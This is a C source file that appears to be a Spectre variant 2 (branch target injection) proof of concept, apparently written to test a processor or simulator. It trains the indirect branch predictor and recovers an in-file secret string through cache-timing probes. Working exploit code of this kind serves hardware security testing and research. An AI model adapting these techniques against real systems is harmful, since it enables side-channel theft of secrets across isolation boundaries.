#include <klib.h>
#include <stdint.h>
#include "cache-utils.h"

#ifndef SECRET_SZ
#define SECRET_SZ 1
#endif
#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif
#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif
#ifndef V2_ATTACK_TRIES
#define V2_ATTACK_TRIES 1
#endif
#ifndef V2_TRAINING_LOOPS
#define V2_TRAINING_LOOPS 16
#endif

static uint8_t __attribute__((aligned(4096))) channel[256 * L1_BLOCK_SZ_BYTES];
static char secret[] = "S3CreT";
static volatile uintptr_t target_value;

static void topTwoIdx(uint64_t *inArray, uint64_t inArraySize,
                      uint8_t *outIdxArray, uint64_t *outValArray)
{
  outValArray[0] = 0;
  outValArray[1] = 0;

  for (uint64_t i = 0; i < inArraySize; ++i) {
    if (inArray[i] > outValArray[0]) {
      outValArray[1] = outValArray[0];
      outValArray[0] = inArray[i];
      outIdxArray[1] = outIdxArray[0];
      outIdxArray[0] = i;
    } else if (inArray[i] > outValArray[1]) {
      outValArray[1] = inArray[i];
      outIdxArray[1] = i;
    }
  }
}

static inline uint64_t candidateValue(uint64_t idx)
{
  if (idx < 10)
    return '0' + idx;
  if (idx < 36)
    return 'A' + (idx - 10);
  return 'a' + (idx - 36);
}

static __attribute__((noinline)) int gadget(char *addr)
{
  return channel[(uint64_t)(uint8_t)*addr * L1_BLOCK_SZ_BYTES];
}

static __attribute__((noinline)) int safe_target(char *addr)
{
  return (int)(uintptr_t)addr & 1;
}

static __attribute__((noinline)) int victim(char *addr, int input)
{
  int junk = 0;
  for (int i = 1; i <= 64; ++i) {
    input += i;
    junk += input & i;
  }

  int (*fn)(char *) = (int (*)(char *))target_value;
  return fn(addr) & junk;
}

static void diag_mark(const char *label, int try_idx)
{
  printf("[v2-diag] %s try=%d\n", label, try_idx);
}

static void read_byte(char *addr_to_read, uint8_t result[2],
                      uint64_t score[2], uint64_t threshold)
{
  uint64_t hits[256];
  int junk = 0;

  for (uint64_t i = 0; i < 256; ++i)
    hits[i] = 0;

  for (int tries = V2_ATTACK_TRIES; tries > 0; --tries) {
    diag_mark("try-begin", tries);
#if USE_EVICTION_FLUSH
    flushCache((uint64_t)channel, sizeof(channel));
#else
    for (uint64_t i = 0; i < 256; ++i)
      xs_flush_cache_line(&channel[i * L1_BLOCK_SZ_BYTES]);
#endif
    xs_fence();
    diag_mark("after-flush-1", tries);

    char dummy = (char)(tries & 0xff);

    target_value = (uintptr_t)&gadget;
    xs_fence();
    for (int j = V2_TRAINING_LOOPS; j > 0; --j)
      junk ^= victim(&dummy, 0);
    diag_mark("after-train", tries);

#if USE_EVICTION_FLUSH
    flushCache((uint64_t)channel, sizeof(channel));
#else
    for (uint64_t i = 0; i < 256; ++i)
      xs_flush_cache_line(&channel[i * L1_BLOCK_SZ_BYTES]);
#endif
    xs_fence();
    diag_mark("after-flush-2", tries);

    target_value = (uintptr_t)&safe_target;
    xs_flush_cache_line((void *)&target_value);
    xs_fence();
    junk ^= victim(addr_to_read, 0);
    diag_mark("after-victim", tries);

    for (uint64_t i = 0; i < 62; ++i) {
      uint64_t mixed_i = candidateValue(i);
      uint64_t elapsed = xs_probe_time(&channel[mixed_i * L1_BLOCK_SZ_BYTES]);
      if (elapsed <= threshold)
        hits[mixed_i]++;
    }
    diag_mark("after-probe", tries);
  }

  topTwoIdx(hits, 256, result, score);
  (void)junk;
}

int main(void)
{
  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  uint64_t measured_threshold = xs_calibrate_threshold(channel, L1_BLOCK_SZ_BYTES);
  uint64_t threshold = measured_threshold;

#if USE_FIXED_CACHE_HIT_THRESHOLD
  threshold = CACHE_HIT_THRESHOLD;
#else
  if (threshold == 0)
    threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[v2] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v2] reading %d bytes\n", SECRET_SZ);

  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    printf("[v2-diag] byte-start index=%lu expected=0x%02x\n",
           i, (uint8_t)secret[i]);
    read_byte(&secret[i], result, score, threshold);
    printf("[v2] byte %2lu: %c (0x%02x) score=%lu\n",
           i,
           (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
           result[0], score[0]);
    printf("[v2] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
           (secret[i] >= 32 && secret[i] < 127) ? secret[i] : '?',
           (uint8_t)secret[i],
           (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
           result[1], score[1]);
    printf("[v2] check %lu 0x%02x 0x%02x\n", i, result[0],
           (uint8_t)secret[i]);
  }

  return 0;
}
